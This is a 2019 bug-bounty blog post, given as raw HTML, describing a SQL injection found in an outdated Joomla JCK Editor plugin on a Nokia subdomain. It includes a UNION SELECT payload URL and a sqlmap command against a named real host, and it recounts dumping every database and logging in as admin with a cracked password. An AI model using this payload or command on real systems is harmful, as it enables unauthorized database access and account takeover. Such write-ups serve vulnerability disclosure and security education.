<!doctype html><html><head><title>SQL Injection on Nokia subdomain - Khaled Nassar</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content="Khaled Nassar"><link rel="shortcut icon" type=image/x-icon href=https://blog.knas.me/img/favicon.ico><link rel=stylesheet href=https://blog.knas.me/style.min.39acacc5d2051426f655a6b7fbf4786fbd0fd8fffd09322c9b497ef0f7439b3f.css integrity="sha256-OaysxdIFFCb2Vaa3+/R4b70P2P/9CTIsm0l+8PdDmz8="><link rel=stylesheet href=https://blog.knas.me/style-dark.min.0a647fb6c07e04b77b54fa0515d0a683d39ecdb251dba960fe1f966f7ff36fc2.css media="(prefers-color-scheme: dark)" integrity="sha256-CmR/tsB+BLd7VPoFFdCmg9OezbJR26lg/h+Wb3/zb8I="><link rel=stylesheet href=https://use.fontawesome.com/releases/v5.15.1/css/all.css><meta property="og:title" content="SQL Injection on Nokia subdomain"><meta property="og:description" content="this blog is about SQL Injection on nokia subdomain"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.knas.me/blog/nokia_sqli/"><meta property="article:section" content="blog"><meta property="article:published_time" content="2019-11-04T17:55:28+08:00"><meta property="article:modified_time" content="2019-11-04T17:55:28+08:00"><meta itemprop=name content="SQL Injection on Nokia subdomain"><meta itemprop=description content="this blog is about SQL Injection on nokia subdomain"><meta itemprop=datePublished content="2019-11-04T17:55:28+08:00"><meta itemprop=dateModified content="2019-11-04T17:55:28+08:00"><meta itemprop=wordCount content="175"><meta itemprop=keywords content="bugbounty,security,webpentesting,"><meta name=twitter:card content="summary"><meta name=twitter:image content="https://blog.knas.me/img/https://avatars.githubusercontent.com/u/45688522?v=4"><meta name=twitter:title content="SQL Injection on Nokia subdomain"><meta name=twitter:description content="this blog is about SQL Injection on nokia subdomain"><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script>
<script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body><h1>SQL Injection on Nokia subdomain</h1><header><div class=avatar><img class=avatarMask src="https://blog.knas.me/img/https://avatars.githubusercontent.com/u/45688522?v=4" alt>
<a href=https://blog.knas.me><img class=avatar-border src=https://blog.knas.me/img/avatar-border.svg alt></a></div><h2><a class=author href=https://blog.knas.me>Khaled Nassar</a></h2></header><p class=date>November 4, 2019</p><div id=tags><ul><li><a href=https://blog.knas.me/tags/bugbounty/>bugbounty</a></li><li><a href=https://blog.knas.me/tags/security/>security</a></li><li><a href=https://blog.knas.me/tags/webpentesting/>webpentesting</a></li></ul></div><div id=contentBody><p>Hello :wave:, I&rsquo;ll share with you how I found sqli on Nokia that makes me able to login into the admin page
you will not see something new here like new techniques or something, just simple steps</p><p>after doing subdomain enumeration I found a subdomain that&rsquo;s working with Joomla, after that I ran joomscan to get the version of the cms and plugins to see if there&rsquo;s any outdated version to exploit it, and joomscan gives me an old plugin called <code>JCK Editor</code> with version <code>6.4.4</code>
and after searching with this version on exploit-DB i found SQLI injection in this version <a href=https://www.exploit-db.com/exploits/45423>CVE-2018-17254</a></p><pre tabindex=0><code>Test = [HOST]/[PATH]/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&amp;view=menu&amp;parent=%22%20UNION%20SELECT%20NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL--%20aa
</code></pre><p><img src=https://1.bp.blogspot.com/-LgYxMfeJKhs/Xscwx2tKONI/AAAAAAAAEMs/HJ5I5jgXFv8ExESVK3bm0Mk2hpQWbDiagCK4BGAsYHg/nokiasql.png alt=sql_nokia></p><p>as you can see, we can get the version of the database :mag:</p><p>this time for my fav weapon (SQLMAP)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ sqlmap -u <span style=color:#e6db74>&#39;https://gdclive.nokia.com/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&amp;view=menu&amp;parent=&#39;</span> --level<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span> --risk<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span> --random-agent --technique<span style=color:#f92672>=</span>U -p parent --batch --current-DB --current-user
</span></span></code></pre></div><p>you can see the current user and the name of the database :)</p><p>After dumping all databases using the &ndash;all option and unencrypt the password of the admin account let&rsquo;s login in admin panel</p><p><img src=https://1.bp.blogspot.com/-87ctqF3EmDM/XscxFpvVAhI/AAAAAAAAENE/Cgi-Kfnjxco0cND_FONrVmsOWySdiu_SQCK4BGAsYHg/cp.jpg alt=nokia_pwn></p><p>see ya :v:</p></div><footer><p>&copy; 2019 Khaled Nassar.
Powered by <a href=https://gohugo.io/>Hugo</a>
using the <a href=https://github.com/koirand/pulp/>pulp</a> theme.</p></footer></body></html>